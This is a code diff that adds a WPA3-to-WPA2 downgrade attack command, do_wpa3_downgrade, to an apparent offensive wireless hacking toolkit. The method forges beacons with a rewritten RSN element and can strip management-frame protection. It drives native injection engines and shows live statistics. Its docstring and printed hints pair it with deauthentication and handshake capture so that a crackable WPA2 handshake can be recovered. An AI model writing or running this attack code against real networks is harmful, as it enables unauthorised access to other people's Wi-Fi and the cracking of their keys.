@@ -558,6 +558,158 @@ class HackITWirelessExecutor:
                           str(ap.get("signal", "?")), ap.get("security", ap.get("encrypt", "?")))
         _console.print(table)
 
+    def do_wpa3_downgrade(self, iface: str, bssid: str = "", ssid: str = "",
+                          channel: int = 6, duration: int = 0,
+                          strip_pmf: bool = True, rate_ms: int = 50,
+                          **kwargs):
+        """WPA3 → WPA2 downgrade attack. Forges spoofed beacons/probe-responses
+        with the RSN IE rewritten to advertise WPA2-PSK/CCMP (and optionally
+        without MFP). Clients that support transition mode will fall back and
+        emit a crackable WPA2 4-way handshake.
+
+        Engine preference: C++ in-process injector (w3d_run) → Go worker →
+        Rust worker → error. Run a deauth loop alongside this to force
+        reassociation once the beacon takes hold.
+
+        This is the pointer that matters on transition-mode deployments:
+        -- strip-pmf only works against PMF-optional transition mode.
+        -- if the target enforces PMF (802.11w required bit set), the client
+           will reject the downgraded beacon and no handshake will appear.
+        """
+        from . import themes as TH
+        iface = iface or self._default_iface()
+        if not iface:
+            UI.print_error("Specify interface.")
+            return
+        if not bssid:
+            UI.print_error("Usage: wpa3-downgrade <iface> <bssid> <ssid> [--channel 6]")
+            return
+        if not ssid:
+            ssid = kwargs.get("ssid") or ""
+        if not self._iface_exists(iface):
+            UI.print_error(f"Interface {iface} not found")
+            return
+        if not self._is_monitor_mode(iface):
+            UI.print_warning(f"{iface} not in monitor mode — beacons will not transmit")
+            UI.print_warning(f"  Switch: mode {iface} monitor")
+
+        lib = self.bridge.c_lib()
+        engine = "cxx"
+        proc = None
+        if lib is None or not hasattr(lib, "w3d_run"):
+            # Fall back to the Go worker, which carries the same logic.
+            try:
+                proc = self.bridge._go_run(
+                    "wpa3-downgrade", iface, bssid, ssid,
+                    "--channel", str(channel),
+                    "--duration", str(duration),
+                )
+                engine = "go"
+            except EngineBuildError:
+                UI.print_error(
+                    "No WPA3 downgrade engine available. Run 'build all' first."
+                )
+                return
+
+        TH.phase_banner(
+            "wpa3-downgrade",
+            f"iface={iface}  bssid={bssid}  ssid={ssid!r}  ch={channel}  "
+            f"pmf={'strip' if strip_pmf else 'keep'}  dur={duration or '∞'}",
+        )
+
+        state = {
+            "bssid": bssid, "ssid": ssid, "channel": channel,
+            "engine": engine, "beacons": 0, "errors": 0,
+            "pps": 0.0, "elapsed": 0.0,
+            "status": "running" if engine == "cxx" else "spawned",
+        }
+
+        stop_flag = {"stop": False}
+
+        def _sig(_s, _f):
+            stop_flag["stop"] = True
+
+        try:
+            signal.signal(signal.SIGINT, _sig)
+            signal.signal(signal.SIGTERM, _sig)
+        except Exception:
+            pass
+
+        started = time.time()
+        if engine == "cxx":
+            rc = self.bridge.c_wpa3_downgrade(
+                iface, bssid, ssid,
+                channel=channel, duration=duration,
+                strip_pmf=strip_pmf, rate_ms=rate_ms,
+            )
+            if rc != 0:
+                codes = {
+                    -1: "already running",
+                    -2: "bad argument",
+                    -3: "invalid BSSID (expected AA:BB:CC:DD:EE:FF)",
+                    -4: "socket/bind failed (need CAP_NET_RAW + monitor iface)",
+                }
+                UI.print_error(
+                    f"WPA3 downgrade failed: {codes.get(rc, f'code {rc}')}"
+                )
+                return
+            UI.print_success(
+                f"WPA3 → WPA2 downgrade live on {bssid} ch{channel} "
+                f"({'PMF stripped' if strip_pmf else 'PMF kept'})."
+            )
+            UI.print_info(
+                "Run 'deauth " + iface + " " + bssid + "' alongside to force "
+                "reassociation, then 'capture handshake " + iface + " " + bssid + "'."
+            )
+        else:
+            UI.print_success(
+                f"WPA3 downgrade spawned via Go worker on {bssid} ch{channel}."
+            )
+
+        try:
+            with TH.LiveOrchestra("wpa3-downgrade", state, rotate_every=6.0,
+                                  refresh=10.0) as lo:
+                last = time.time()
+                while not stop_flag["stop"]:
+                    now = time.time()
+                    state["elapsed"] = now - started
+                    if engine == "cxx":
+                        stats = self.bridge.c_downgrade_stats()
+                        state["beacons"] = stats["sent"]
+                        state["errors"] = stats["errors"]
+                    elif proc is not None:
+                        if proc.poll() is not None:
+                            state["status"] = "exited"
+                            break
+                        # best-effort harvest from worker output
+                        if proc.stdout:
+                            try:
+                                line = proc.stdout.readline()
+                                if line:
+                                    import re as _re
+                                    m = _re.search(r"(\d+)\s*frames", line)
+                                    if m:
+                                        state["beacons"] = int(m.group(1))
+                            except Exception:
+                                pass
+                    if now - last >= 1.0:
+                        state["pps"] = state["beacons"] / max(state["elapsed"], 0.001)
+                        last = now
+                    if duration and state["elapsed"] >= duration:
+                        break
+                    time.sleep(0.25)
+        finally:
+            if engine == "cxx":
+                self.bridge.c_wpa3_downgrade_stop()
+            elif proc is not None and proc.poll() is None:
+                proc.terminate()
+            final = self.bridge.c_downgrade_stats() if engine == "cxx" else {
+                "sent": state["beacons"], "errors": state["errors"]}
+            UI.print_success(
+                f"WPA3 downgrade stopped — beacons={final['sent']} "
+                f"errors={final['errors']} elapsed={state['elapsed']:.1f}s"
+            )
+
     def do_hidden_ssid(self, interface: str = "", **kwargs):
         iface = interface or self._default_iface()
         UI.print_info(f"Scanning for hidden SSIDs on {iface}...")
